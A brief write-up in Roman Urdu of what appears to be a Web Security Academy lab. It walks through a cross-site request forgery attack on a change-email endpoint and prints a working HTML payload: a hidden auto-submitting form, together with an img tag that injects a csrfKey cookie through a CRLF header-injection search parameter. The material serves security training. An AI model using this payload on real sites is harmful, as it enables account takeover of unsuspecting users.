burpsuite on tha phir main login page pr gya wahan wiener peter sy login kiya phir update email main apny aap sy aik 
email change kr di jaisy test@tesss.com ius ky baad burpsuite main gya wahan sy ius POST change/email wali request ky
csrfkey + csrf token ko copy kiya phir exploit server main gya wahan body section main 
<html>
  <body>
    <form action="https://0a34004b04b3113980fccbd8007800ab.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sdasevil@sadevil.com">
      <input type="hidden" name="csrf" value="pB4M7BHMIn2hQROcR2z0OfnnwldxwoQz">
    </form>
    <img src="https://0a34004b04b3113980fccbd8007800ab.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=6LbtJoTyKY8c3VPKhrKwB6sB3Mmj2VMT%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
yeh paste kr diya iss main mane apna lab ka url 2 jagah pr daala aik new email daali phir csrf value main copy kiya hua
wiener ka csrf token daala phir img waly tag main csrf key inject ki jo ky wiener ki copy ki hue thi phir deliver to victim kiya
or lab solved
